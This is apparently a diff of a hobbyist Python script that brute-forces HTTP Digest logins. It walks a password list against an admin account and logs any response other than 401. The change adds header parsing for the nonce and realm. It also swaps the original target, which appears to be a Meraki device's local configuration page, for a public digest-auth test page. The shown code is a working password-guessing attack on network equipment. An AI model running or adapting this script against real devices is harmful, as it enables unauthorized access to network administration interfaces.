@@ -1,4 +1,5 @@
 import hashlib
+import re
 import requests
 import secrets
 
@@ -27,17 +28,24 @@ def hashes(user, realm, password, method, uri, nonce, cnonce, qop) -> str:
     return response
 
 
+reg = re.compile('(\w+)[:=] ?"?(\w+)"?')
+
+
+def parse_authheaders(authheader) -> str:
+    authheaders_dict = dict(reg.findall(authheader))
+    nonce = authheaders_dict['nonce']
+    return nonce
+
+
 def main():
     # manual progress tracking, I know
     total = 0
 
-    url = 'http://172.16.1.1/configure'
-    # testurl = 'https://jigsaw.w3.org/HTTP/Digest/'
+    # url = 'http://172.16.1.1/configure'
+    url = 'https://jigsaw.w3.org/HTTP/Digest/'
 
     # customizable, don't know how to read headers and extract these on the fly because they're not json or dictionaries
     user = 'admin'
-    realm = 'Meraki Manual Configuration. The login is \'admin\' and the password has been administratively ' \
-            'configured on Meraki Dashboard. '
     uri = '/configure'
     method = 'HEAD'
     qop = 'auth'
@@ -54,7 +62,10 @@ def main():
     # get a new nonce to start the chain
     # idk how to get this via comprehension, this is a problem with realm and qop too, and leads to ugly slicing
     r = requests.head(url)
-    nonce = r.headers['WWW-Authenticate'][180:-13]
+    realm_dict = dict(reg.findall(r.headers['www-authenticate']))
+    realm = realm_dict['realm']
+    print('realm is', realm)
+    nonce = parse_authheaders(r.headers['www-authenticate'])
 
     for i in range(total, len(passwords)):
         cnonce = secrets.token_hex(8)
@@ -69,11 +80,12 @@ def main():
         if request.status_code != 401:
             log(request, passwords[i], i)
 
-        nonce = request.headers['WWW-Authenticate'][180:-13]
+        nonce = parse_authheaders(request.headers['www-authenticate'])
 
-        if i % 100 == 0:
-            print(i, end=', ')
-        # print(i, passwords[i], reqest.status_code)
+        # if i % 100 == 0:
+        #     print(i, end=', ')
+        print(i, passwords[i], request.status_code)
+        print(nonce)
 
     print('Ç\'est la fin')
 
